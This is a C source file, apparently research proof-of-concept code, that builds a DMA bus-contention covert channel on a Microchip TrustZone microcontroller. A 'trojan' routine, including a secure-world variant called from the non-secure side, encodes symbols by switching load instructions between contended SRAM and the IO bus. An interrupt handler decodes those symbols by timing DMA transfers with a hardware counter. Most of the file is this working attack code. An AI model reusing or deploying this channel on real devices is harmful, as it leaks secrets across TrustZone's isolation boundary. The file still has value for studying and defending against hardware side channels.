/**
 * \file
 *
 * Copyright (c) 2018 Microchip Technology Inc. and its subsidiaries.
 *
 * \asf_license_start
 *
 * \page License
 *
 * Subject to your compliance with these terms, you may use Microchip
 * software and any derivatives exclusively with Microchip products.
 * It is your responsibility to comply with third party license terms applicable
 * to your use of third party software (including open source software) that
 * may accompany Microchip software.
 *
 * THIS SOFTWARE IS SUPPLIED BY MICROCHIP "AS IS".  NO WARRANTIES,
 * WHETHER EXPRESS, IMPLIED OR STATUTORY, APPLY TO THIS SOFTWARE,
 * INCLUDING ANY IMPLIED WARRANTIES OF NON-INFRINGEMENT, MERCHANTABILITY,
 * AND FITNESS FOR A PARTICULAR PURPOSE. IN NO EVENT WILL MICROCHIP BE
 * LIABLE FOR ANY INDIRECT, SPECIAL, PUNITIVE, INCIDENTAL OR CONSEQUENTIAL
 * LOSS, DAMAGE, COST OR EXPENSE OF ANY KIND WHATSOEVER RELATED TO THE
 * SOFTWARE, HOWEVER CAUSED, EVEN IF MICROCHIP HAS BEEN ADVISED OF THE
 * POSSIBILITY OR THE DAMAGES ARE FORESEEABLE.  TO THE FULLEST EXTENT
 * ALLOWED BY LAW, MICROCHIP'S TOTAL LIABILITY ON ALL CLAIMS IN ANY WAY
 * RELATED TO THIS SOFTWARE WILL NOT EXCEED THE AMOUNT OF FEES, IF ANY,
 * THAT YOU HAVE PAID DIRECTLY TO MICROCHIP FOR THIS SOFTWARE.
 *
 * \asf_license_stop
 *
 */

#include "atmel_start.h"
#include "trustzone_veneer.h"
#include "driver_examples.h"


uint32_t src[10] = {1,2,3,4,5,6,7,8,9,10};
uint32_t dst[10] = {0};

//******************************************************************************
// DMA Covert-Channel 
//******************************************************************************

#define SETUP_COLLISION_SRAM1()do { \
	__asm("ldr r0, =0x20002000"); \
} while(0)

#define SETUP_NO_COLLISION_IOBUS()do { \
	__asm("ldr r0, =0x60000000"); \
} while(0)

#define SETUP_CONTENTION()do { \
	SETUP_COLLISION_SRAM1(); \
} while(0)

#define SETUP_NO_CONTENTION()do { \
	SETUP_NO_COLLISION_IOBUS(); \
} while(0)


#define TEN_LDRS() do { \
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
	__asm volatile("ldr r1, [r0]");\
} while(0)

#define HUND_LDRS()do {\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
		TEN_LDRS();\
	} while(0)

#define MAX_SYMBOL 256
#define N_SAMPLES 100
#define TRASNFER_SIZE 8000

#define TROJAN_SECURE
// #define CONTENTION

__attribute__((optimize(0))) void trojan(int input_symbol){
  // Trying to balance this code in terms of time as much as possible  
  for(int i=0;i < MAX_SYMBOL; i++){
    if(i < input_symbol){
      #ifdef CONTENTION
        SETUP_CONTENTION();
      #else
        SETUP_NO_CONTENTION();
      #endif
    }
    // With else it would be unbalanced in terms of LDRs
    if(i >= input_symbol){
    	SETUP_NO_CONTENTION();
    }
    HUND_LDRS();
  }
}

void config_DMA_M2M(int size){
// Make this vars global. The stack will be destroyed.
 	static int src, dst;
	// printf("%x\r\n", &cont);
	_dma_srcinc_enable(0, false);
	_dma_dstinc_enable(0, false);
	// We can only see contention when the is reading and writing form and to
	//different addrs
	_dma_set_source_address(0, &src);
	_dma_set_destination_address(0, &dst);
	_dma_set_data_amount(0, size);
	_dma_enable_transaction(0, false); // enable but not trigger
	_dma_set_irq_state(0, 0, true);
}

int input_symbol = 0, sample = 0;

__attribute__((optimize(0))) void DMAC_0_Handler(void)
{	
	int *ptr_ctr = 0x42001000; 
	int *ptr_cnt = 0x42001000+0x14; // (32 bits)
	int *ptr_DMA_trigger = 0x41006000 + 0x10;
	int *ptr_readsync = 0x42001000 + 0x04; // timer register to sync counter read 
	*ptr_readsync = 0x8000;
	*ptr_ctr &= ~(1<<1);	
	 printf("(%d, %d)\r\n", input_symbol, *ptr_cnt);
	 // Default: channel 0, For other dma channel, write to CHID the channel ID 
	hri_dmac_clear_CHINTFLAG_TCMPL_bit(DMAC); 
	sample++;
	// N_SAMPLES per input symbol
	if(sample >= N_SAMPLES){
		if(input_symbol < MAX_SYMBOL-1){
			input_symbol++;
			sample = 0;
		}
		else {
			input_symbol = 0;
			return;
		}
	}

	config_DMA_M2M(TRASNFER_SIZE);
	*ptr_cnt = 0;
	*ptr_ctr |= (1<<1);
	//start DMA transaction
	*ptr_DMA_trigger |= (1<<0);
	#ifdef TROJAN_SECURE
		trojan_s(input_symbol);
	#else
		trojan(input_symbol);
	#endif
	return;
}

__attribute__((optimize(0))) void covert_channel(){
	int *ptr_ctr = 0x42001000; 
	int *ptr_cnt = 0x42001000+0x14; // (32 bits)
	int *ptr_DMA_trigger = 0x41006000 + 0x10;
	// trigger chain of interrupts (DMA transfers)
	config_DMA_M2M(TRASNFER_SIZE);
	*ptr_cnt = 0;
	*ptr_ctr |= (1<<1);
	//start DMA transaction
	*ptr_DMA_trigger |= (1<<0);
	#ifdef TROJAN_SECURE
		trojan_s(input_symbol);
	#else
		trojan(input_symbol);
	#endif
	while(1);
}

//******************************************************************************

/* Non-secure main() */
int main(void)
{
	atmel_start_init();
	hri_mclk_set_AHBMASK_DMAC_bit(MCLK);
	_dma_init();
	covert_channel();
	while (1);
}
